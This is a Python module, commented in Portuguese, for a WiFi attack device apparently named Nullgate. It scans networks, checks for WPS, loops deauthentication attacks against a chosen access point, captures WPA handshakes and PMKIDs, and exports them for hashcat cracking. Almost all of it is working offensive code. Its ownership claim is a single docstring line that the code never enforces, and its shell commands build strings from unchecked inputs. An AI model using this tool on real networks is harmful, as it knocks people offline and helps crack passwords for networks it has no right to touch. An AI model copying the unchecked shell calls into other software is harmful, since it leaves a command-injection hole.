"""
Modulo WiFi do Nullgate: scan de redes, captura de handshake e export p/ hashcat.
Opera na interface de radio (adaptador USB, tipicamente wlan1), nunca na wlan0.

Auditoria das PROPRIAS redes. A UI exige confirmacao de autorizacao.
"""
import csv
import glob
import json
import os
import re
import signal
import subprocess
import time

DEFAULT_RADIO = os.environ.get("NULLGATE_RADIO", "wlan1")  # placa de ataque padrao
WORK = "/tmp/nullgate"
DATA = "/opt/nullgate/data"
STORE = f"{DATA}/networks.json"
os.makedirs(WORK, exist_ok=True)
try:
    os.makedirs(DATA, exist_ok=True)
except OSError:
    DATA = WORK
    STORE = f"{DATA}/networks.json"
CAPTURES = f"{DATA}/captures"
try:
    os.makedirs(CAPTURES, exist_ok=True)
except OSError:
    CAPTURES = WORK

_capture = {"proc": None, "deauth": None, "started": 0, "targets": [], "iface": None,
            "essid": None, "mode": "ativo", "bssid": None, "ch": None}


def _cap_file():
    files = sorted(glob.glob(f"{WORK}/cap-*.cap"))
    return files[-1] if files else None


def _slug(s):
    return re.sub(r"[^A-Za-z0-9_-]", "_", (s or "rede"))[:40]


def _sh(cmd, timeout=20):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          errors="replace", timeout=timeout)


def _pick(iface):
    """Interface a usar: a escolhida, ou a padrao."""
    return iface or DEFAULT_RADIO


def _radio_present(iface):
    return os.path.exists(f"/sys/class/net/{iface}")


def _set_monitor(iface):
    _sh(f"ip link set {iface} down")
    _sh(f"iw dev {iface} set type monitor")
    _sh(f"ip link set {iface} up")
    time.sleep(1.5)  # rtl8xxxu precisa assentar antes de capturar


def _set_managed(iface):
    _sh(f"ip link set {iface} down")
    _sh(f"iw dev {iface} set type managed")
    _sh(f"ip link set {iface} up")


def _cleanup_iface(iface):
    """Mata capturas/ataques orfaos. NAO troca o modo (quem chama decide:
    scan/recon vao pra monitor, stop vai pra managed) — evita transicoes extras
    que confundem o rtl8xxxu."""
    _sh("pkill -9 hcxdumptool 2>/dev/null; pkill -9 aireplay-ng 2>/dev/null; "
        "pkill -9 airodump-ng 2>/dev/null; pkill -9 wash 2>/dev/null", timeout=10)
    _capture["proc"] = None
    time.sleep(0.4)


def _usb_reset(iface):
    """Corta e religa a energia do adaptador USB — revive firmware travado
    do rtl8xxxu (comum em adaptadores baratos apos uso intenso de monitor/deauth)."""
    try:
        link = os.path.realpath(f"/sys/class/net/{iface}/device")  # .../1-1.2:1.0
        node = os.path.basename(link).split(":")[0]                # 1-1.2
        auth = f"/sys/bus/usb/devices/{node}/authorized"
        if os.path.exists(auth):
            _sh(f"echo 0 > {auth}", timeout=8)
            time.sleep(3)
            _sh(f"echo 1 > {auth}", timeout=8)
            time.sleep(9)   # rtl8188fu demora a reaparecer e estabilizar
            return True
    except Exception:
        pass
    return False


def reset_radio(iface=None):
    """Botao de panico: mata orfaos, re-energiza o USB e volta pra managed."""
    iface = _pick(iface)
    _sh("pkill -9 hcxdumptool 2>/dev/null; pkill -9 aireplay-ng 2>/dev/null; "
        "pkill -9 airodump-ng 2>/dev/null; pkill -9 wash 2>/dev/null", timeout=10)
    _capture["proc"] = None
    revived = _usb_reset(iface)
    time.sleep(1)
    if _radio_present(iface):
        _set_managed(iface)
    return {"ok": True, "usb_reset": revived,
            "msg": f"{iface} resetada" + (" + USB re-energizado" if revived else "")}


def _own_essid(essid):
    """Heuristica: marca redes do dono (WR / loja). Ajustavel."""
    e = (essid or "").lower()
    return any(k in e for k in ["wr_", "wr ", "lk_", "iot", "supermerc", "wr-"])


def scan(seconds=12, iface=None, _retry=True):
    iface = _pick(iface)
    if not _radio_present(iface):
        return {"ok": False, "error": f"interface {iface} ausente."}
    _cleanup_iface(iface)  # mata orfaos
    for f in glob.glob(f"{WORK}/scan-*.csv"):
        try:
            os.remove(f)
        except OSError:
            pass
    _set_monitor(iface)
    try:
        # saida do airodump vai pro /dev/null (lemos o CSV do disco; evita
        # acumular MBs de saida binaria na RAM do Card)
        _sh(
            f"timeout {seconds} airodump-ng {iface} --band bg "
            f"-w {WORK}/scan --output-format csv --write-interval 3 "
            f">/dev/null 2>&1",
            timeout=seconds + 10,
        )
    finally:
        _set_managed(iface)
    nets = _parse_scan()
    # 0 redes quase sempre = adaptador rtl8xxxu travado. Re-energiza e tenta 1x.
    if not nets and _retry:
        _usb_reset(iface)
        return scan(seconds, iface, _retry=False)
    return {"ok": True, "iface": iface, "networks": nets, "recuperado": not _retry}


def _parse_scan():
    files = sorted(glob.glob(f"{WORK}/scan-*.csv"))
    if not files:
        return []
    nets = []
    with open(files[-1], errors="ignore") as fh:
        rows = list(csv.reader(fh))
    for r in rows:
        if not r or "Station MAC" in r[0]:
            if r and "Station MAC" in r[0]:
                break
            continue
        if ":" in r[0] and len(r) > 13:
            bssid = r[0].strip()
            try:
                ch = r[3].strip()
                pwr = r[8].strip()
                enc = r[5].strip()
                essid = r[13].strip()
            except IndexError:
                continue
            if not essid:
                continue
            nets.append({
                "bssid": bssid,
                "canal": ch,
                "sinal": pwr,
                "seguranca": enc,
                "essid": essid,
                "meu": _own_essid(essid),
            })
    # agrupa por ESSID, guardando cada AP (mesh) com sua propria seguranca
    agg = {}
    for n in nets:
        k = n["essid"]
        if k not in agg:
            agg[k] = {"essid": k, "meu": n["meu"], "aps": [], "canais": set(), "segs": set()}
        agg[k]["aps"].append({"bssid": n["bssid"], "canal": n["canal"],
                              "seguranca": n["seguranca"], "wpa3": _is_wpa3(n["seguranca"])})
        if n["canal"]:
            agg[k]["canais"].add(n["canal"])
        if n["seguranca"]:
            agg[k]["segs"].add(n["seguranca"])
    out = []
    for v in agg.values():
        v["canais"] = sorted(v["canais"])
        v["qtd_aps"] = len(v["aps"])
        # resumo de seguranca da rede (o "mais forte" presente)
        segs = v.pop("segs")
        v["seguranca"] = " / ".join(sorted(segs)) if segs else "?"
        v["tem_wpa3"] = any(a["wpa3"] for a in v["aps"])
        v["bssids"] = [a["bssid"] for a in v["aps"]]  # compat
        out.append(v)
    out.sort(key=lambda x: (not x["meu"], x["essid"]))
    return out


def _is_wpa3(sec):
    s = (sec or "").upper()
    return "WPA3" in s or "SAE" in s


# ---------------- store (salva recon por rede) ----------------
def _load_store():
    try:
        with open(STORE) as f:
            return json.load(f)
    except Exception:
        return {}


def _save_store(d):
    try:
        with open(STORE, "w") as f:
            json.dump(d, f, ensure_ascii=False, indent=1)
    except OSError:
        pass


def saved_networks():
    d = _load_store()
    out = list(d.values())
    out.sort(key=lambda x: x.get("ts", 0), reverse=True)
    return {"ok": True, "redes": out}


def forget_network(essid):
    d = _load_store()
    d.pop(essid, None)
    _save_store(d)
    return {"ok": True}


# ---------------- recon (analise focada da rede) ----------------
def recon(essid, bssids, channels, iface=None):
    iface = _pick(iface)
    if not _radio_present(iface):
        return {"ok": False, "error": f"interface {iface} ausente."}
    chans = [str(c) for c in (channels or [])] or ["1", "6", "11"]
    _cleanup_iface(iface)
    for f in glob.glob(f"{WORK}/recon-*"):
        try:
            os.remove(f)
        except OSError:
            pass
    _set_monitor(iface)
    try:
        # airodump focado: cifra/auth + contagem de clientes
        _sh(
            f"timeout 12 airodump-ng {iface} -c {','.join(chans)} "
            f"-w {WORK}/recon --output-format csv --write-interval 3 >/dev/null 2>&1",
            timeout=20,
        )
        enc, clients = _parse_recon(bssids)
        # wash: deteccao de WPS
        wps = _wash(iface, chans[0], bssids)
    finally:
        _set_managed(iface)

    wpa3 = _is_wpa3(enc.get("privacy", "") + " " + enc.get("auth", ""))
    sae_only = "SAE" in enc.get("auth", "").upper() and "PSK" not in enc.get("auth", "").upper()
    result = {
        "essid": essid,
        "bssids": bssids,
        "canais": chans,
        "seguranca": enc.get("privacy", "?"),
        "cifra": enc.get("cipher", "?"),
        "auth": enc.get("auth", "?"),
        "wps": wps,                       # "aberto" | "travado" | "nao" | "desconhecido"
        "clientes": clients,
        "wpa3": wpa3,
        # WPA3 puro (SAE-only) exige PMF -> deauth bloqueado. Transicao (SAE+PSK) pode cair.
        "deauth": "bloqueado" if sae_only else ("parcial" if wpa3 else "ok"),
        "captura_viavel": clients > 0 or enc.get("privacy", "").startswith("WPA"),
        "ts": int(time.time()),
    }
    # salva
    store = _load_store()
    store[essid] = result
    _save_store(store)
    return {"ok": True, **result}


def _parse_recon(bssids):
    files = sorted(glob.glob(f"{WORK}/recon-*.csv"))
    enc = {}
    clients = 0
    targets = {b.lower() for b in bssids}
    if not files:
        return enc, clients
    with open(files[-1], errors="replace") as fh:
        rows = list(csv.reader(fh))
    in_stations = False
    for r in rows:
        if r and "Station MAC" in r[0]:
            in_stations = True
            continue
        if not r or len(r) < 6:
            continue
        if not in_stations and ":" in r[0] and r[0].strip().lower() in targets:
            enc = {
                "privacy": r[5].strip(),
                "cipher": r[6].strip() if len(r) > 6 else "",
                "auth": r[7].strip() if len(r) > 7 else "",
            }
        elif in_stations and len(r) > 5 and r[5].strip().lower() in targets:
            clients += 1
    return enc, clients


def _wash(iface, channel, bssids):
    if not _which("wash"):
        return "desconhecido"
    out = _sh(f"timeout 10 wash -i {iface} -c {channel} 2>/dev/null", timeout=16).stdout
    targets = {b.lower() for b in bssids}
    for line in out.splitlines():
        parts = line.split()
        if parts and ":" in parts[0] and parts[0].lower() in targets:
            locked = "yes" in line.lower() and "lock" in line.lower()
            # heuristica: coluna Lck costuma ser "Yes"/"No"
            low = line.lower()
            if " yes" in low:
                return "travado"
            return "aberto"
    return "nao"


def _which(prog):
    return subprocess.run(f"command -v {prog}", shell=True,
                          capture_output=True).returncode == 0


def capture_start(bssids, channels, iface=None, mode="ativo", essid=None):
    """mode: 'ativo' = derruba clientes (deauth) e captura handshake+PMKID;
             'passivo' = so escuta, sem enviar nada."""
    iface = _pick(iface)
    if not _radio_present(iface):
        return {"ok": False, "error": f"interface {iface} ausente."}
    if _capture["proc"] and _capture["proc"].poll() is None:
        return {"ok": False, "error": "captura ja em andamento"}
    if not bssids:
        return {"ok": False, "error": "nenhum BSSID alvo"}
    # usa airodump-ng + aireplay-ng (funcionam no rtl8xxxu; hcxdumptool nao arma)
    bssid = bssids[0]                       # airodump mira um AP (o alvo escolhido)
    ch = str(channels[0]) if channels else "1"
    for f in glob.glob(f"{WORK}/cap-*"):
        try:
            os.remove(f)
        except OSError:
            pass
    _cleanup_iface(iface)
    _set_monitor(iface)
    _last_hs.update(ts=0, n=0)
    # airodump fixo no canal/AP: captura o 4-way handshake no .cap
    airo = subprocess.Popen(
        ["airodump-ng", "-c", ch, "--bssid", bssid, "-w", f"{WORK}/cap",
         "--output-format", "pcap", iface],
        stdout=open(f"{WORK}/airo.log", "w"), stderr=subprocess.STDOUT,
        preexec_fn=os.setsid,
    )
    deauth_proc = None
    if mode == "ativo":
        # rajadas de deauth intercaladas: derruba, pausa 6s pra reconectar e soltar o handshake
        deauth_proc = subprocess.Popen(
            ["bash", "-c",
             f"while true; do aireplay-ng --deauth 4 -a {bssid} {iface} "
             f">/dev/null 2>&1; sleep 6; done"],
            preexec_fn=os.setsid,
        )
    _capture.update({"proc": airo, "deauth": deauth_proc, "started": time.time(),
                     "targets": bssids, "iface": iface, "essid": essid,
                     "mode": mode, "bssid": bssid, "ch": ch})
    return {"ok": True, "msg": "captura iniciada", "iface": iface, "modo": mode,
            "alvo": bssid, "canal": ch}


def deauth(bssid, channel, iface=None, seconds=10):
    """Derruba os clientes de um AP (forca reconexao). So em redes suas."""
    iface = _pick(iface)
    if not _radio_present(iface):
        return {"ok": False, "error": f"interface {iface} ausente."}
    if _capture["proc"] and _capture["proc"].poll() is None:
        return {"ok": False, "error": "pare a captura antes (mesma placa)"}
    _set_monitor(iface)
    try:
        if channel:
            _sh(f"iw dev {iface} set channel {channel}", timeout=8)
        r = _sh(f"timeout {seconds} aireplay-ng --deauth 0 -a {bssid} {iface}",
                timeout=seconds + 8)
    finally:
        _set_managed(iface)
    sent = r.stdout.count("Sending") + r.stdout.count("DeAuth")
    return {"ok": True, "bssid": bssid, "pacotes": sent, "saida": r.stdout[-400:]}


# ---------------- arquivos salvos ----------------
def _persist(src, label):
    """Copia um arquivo de captura/hash para a pasta persistente."""
    if not os.path.exists(src) or os.path.getsize(src) == 0:
        return None
    ext = os.path.splitext(src)[1]
    name = f"{_slug(label)}_{int(time.time())}{ext}"
    dst = f"{CAPTURES}/{name}"
    try:
        import shutil
        shutil.copy(src, dst)
        return name
    except Exception:
        return None


def list_files():
    out = []
    for p in sorted(glob.glob(f"{CAPTURES}/*")):
        try:
            st = os.stat(p)
            out.append({"nome": os.path.basename(p), "bytes": st.st_size,
                        "ts": int(st.st_mtime),
                        "tipo": "handshake" if p.endswith(".hc22000") else
                                "captura" if p.endswith(".pcapng") else "arquivo"})
        except OSError:
            pass
    out.sort(key=lambda x: x["ts"], reverse=True)
    return {"ok": True, "files": out, "pasta": CAPTURES}


def delete_file(name):
    p = f"{CAPTURES}/{os.path.basename(name or '')}"
    if os.path.exists(p):
        os.remove(p)
    return {"ok": True}


def capture_status():
    proc = _capture["proc"]
    running = bool(proc and proc.poll() is None)
    elapsed = int(time.time() - _capture["started"]) if _capture["started"] else 0
    cap = _cap_file()
    size = os.path.getsize(cap) if cap and os.path.exists(cap) else 0
    handshakes = _count_handshakes(cap) if cap and size > 0 else 0
    return {
        "ok": True,
        "rodando": running,
        "segundos": elapsed,
        "bytes": size,
        "handshakes": handshakes,
        "alvos": _capture["targets"],
    }


_last_hs = {"ts": 0, "n": 0}


def _count_handshakes(cap, force=False):
    # throttle: converter o pcapng inteiro a cada 3s pesa no Card; so reconta a cada 8s
    now = time.time()
    if not force and now - _last_hs["ts"] < 8:
        return _last_hs["n"]
    tmp = f"{WORK}/_probe.hc22000"
    try:
        os.remove(tmp)
    except OSError:
        pass
    _sh(f"hcxpcapngtool -o {tmp} {cap} 2>/dev/null", timeout=30)
    n = 0
    if os.path.exists(tmp):
        with open(tmp) as f:
            n = sum(1 for _ in f)
    _last_hs.update(ts=now, n=n)
    return n


def _kill_proc(p):
    if p and p.poll() is None:
        try:
            os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            for _ in range(8):
                if p.poll() is not None:
                    break
                time.sleep(0.2)
            if p.poll() is None:
                os.killpg(os.getpgid(p.pid), signal.SIGKILL)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass


def capture_stop():
    _kill_proc(_capture.get("deauth"))   # para o loop de deauth
    _kill_proc(_capture.get("proc"))     # para o airodump
    _capture["deauth"] = None
    iface = _capture.get("iface") or DEFAULT_RADIO
    _cleanup_iface(iface)      # mata orfaos (aireplay/airodump)
    _set_managed(iface)        # volta pra managed
    cap = _cap_file()
    hs = _count_handshakes(cap, force=True) if cap else 0
    return {"ok": True, "msg": "captura parada", "handshakes": hs, "iface": iface}


def export_hc22000():
    cap = _cap_file()
    out = f"{WORK}/nullgate.hc22000"
    if not cap or not os.path.exists(cap):
        return {"ok": False, "error": "nada capturado ainda"}
    try:
        os.remove(out)
    except OSError:
        pass
    _sh(f"hcxpcapngtool -o {out} {cap}", timeout=60)
    if not os.path.exists(out) or os.path.getsize(out) == 0:
        return {"ok": False, "error": "nenhum handshake valido pra exportar"}
    with open(out) as f:
        content = f.read()
    label = _capture.get("essid") or "rede"
    saved_hash = _persist(out, label)       # guarda o .hc22000
    _persist(cap, label)                    # guarda o .pcapng bruto
    return {
        "ok": True,
        "arquivo": "nullgate.hc22000",
        "salvo_como": saved_hash,
        "linhas": content.count("\n"),
        "conteudo": content,
        "dica": "rode na GPU: hashcat -m 22000 nullgate.hc22000 wordlist.txt",
    }
